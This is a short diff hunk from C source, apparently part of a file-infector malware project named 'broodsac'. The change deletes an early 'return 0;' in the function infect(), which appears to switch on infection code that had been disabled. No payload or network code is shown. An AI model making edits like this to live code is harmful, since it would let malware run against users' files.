@@ -491,8 +491,6 @@ int infect(void)
    InfectorIAT iat;
    load_infector_iat(&iat);
 
-   return 0;
-
 #ifdef BROODSACDEBUG
    // TODO make this a compiler-controlled variable that points at our built executables
    char profile_directory[MAX_PATH+1] = "C:\\Users\\teal\\Documents\\broodsac";
